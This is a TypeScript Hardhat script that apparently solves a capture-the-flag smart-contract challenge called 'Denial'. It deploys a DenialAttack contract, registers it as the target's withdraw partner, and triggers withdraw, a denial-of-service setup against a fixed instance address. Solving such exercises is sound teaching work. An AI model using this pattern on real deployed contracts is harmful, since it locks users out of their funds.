// Runtime Environment's members available in the global scope.
import { ethers } from 'ethers';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { DenialAttack__factory, Denial__factory } from "../typechain";

async function main() {
  const instanceAddress = "0x38e795928569E013EcA3271cf60823aCDEf9b45e";
  const signer = getSigner();

  const denial = await (new DenialAttack__factory(signer)).deploy(instanceAddress);
  const target = Denial__factory.connect(instanceAddress, signer);

  await (await target.setWithdrawPartner(denial.address)).wait();
  await target.withdraw({ gasLimit: 1000000 });
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
